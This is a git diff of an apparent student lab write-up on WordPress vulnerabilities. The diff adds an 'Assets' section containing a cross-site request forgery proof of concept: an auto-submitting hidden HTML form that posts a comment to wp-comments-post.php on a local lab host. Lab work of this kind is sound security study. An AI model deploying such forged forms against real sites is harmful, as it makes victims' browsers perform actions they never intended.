@@ -19,7 +19,7 @@ Time spent: 17 hours spent in total
   - Post a comment to check it is taking the admin's comment
   - Submit a malicious form that goes into /wp-comments-post.php hosted on github
   
-   `<html>
+   <html>
 	      <head></head>
 	      <body>
 		      <form name="csrfForm" action="http://wpdistillery.vm/wp-comments-post.php" method="POST">
@@ -32,7 +32,7 @@ Time spent: 17 hours spent in total
 		      </form> 
 		      <script> document.csrfForm.submit(); </script>
 	      </body>
-    </html>`
+    </html>
 
   - The comment "I made a comment" will be posted after going to the github link which is submitting the form
 - [ ] Affected source code:
@@ -93,6 +93,22 @@ Time spent: 17 hours spent in total
 ## Assets
 
 List any additional assets, such as scripts or files
+1st Vulnerability(Malicious Form):
+<html>
+	<head></head>
+	<body>
+		<form name="csrfForm" action="http://wpdistillery.vm/wp-comments-post.php" method="POST">
+			<input type="hidden" name="comment" value="I made a comment">
+			<input type="hidden" name="comment_post_ID" value="1">
+			<input type="hidden" name="comment_parent" value="0">
+			<input type="hidden" name="_wp_unfiltered_html_comment" value="2746298102">
+			<input type="submit" value="Post+Comment">
+		
+		</form> 
+		<script> document.csrfForm.submit(); </script>
+	</body>
+</html>
+
 
 ## Resources
 
